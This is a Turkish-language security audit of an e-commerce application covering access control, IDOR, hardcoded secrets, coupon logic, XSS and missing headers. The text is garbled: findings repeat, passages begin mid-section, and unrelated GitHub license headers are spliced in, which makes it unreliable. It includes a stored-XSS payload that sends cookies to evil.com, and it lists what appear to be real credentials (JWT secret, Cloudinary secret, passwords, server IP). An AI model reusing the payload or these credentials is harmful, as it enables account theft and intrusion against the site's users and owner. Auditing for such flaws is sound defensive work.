2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
